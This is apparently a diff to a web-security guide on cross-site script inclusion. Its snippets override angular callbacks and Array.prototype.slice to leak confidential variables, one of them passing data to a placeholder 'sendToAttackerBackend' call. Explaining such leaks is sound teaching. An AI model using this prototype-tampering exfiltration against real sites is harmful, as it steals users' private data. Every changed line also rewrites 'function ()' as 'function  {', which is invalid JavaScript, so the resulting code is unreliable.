@@ -40,10 +40,10 @@ If confidential data is stored in a global variable, it can be exploited using s
 
 ```html
 <script>
-  var angular = function () {
+  var angular = function  {
     return 1
   }
-  angular.callbacks = function () {
+  angular.callbacks = function  {
     return 1
   }
   angular.callbacks._7 = function (leaked) {
@@ -67,7 +67,7 @@ If confidential data is stored in a global variable, it can be exploited using s
 For variables not residing in the global namespace, _prototype tampering_ can sometimes be exploited. This technique leverages JavaScript's design, where code interpretation involves traversing the prototype chain to locate the called property. By overriding certain functions, such as `Array`'s `slice`, attackers can access and leak non-global variables:
 
 ```javascript
-Array.prototype.slice = function () {
+Array.prototype.slice = function  {
   // leaks ["secret1", "secret2", "secret3"]
   sendToAttackerBackend(this)
 }
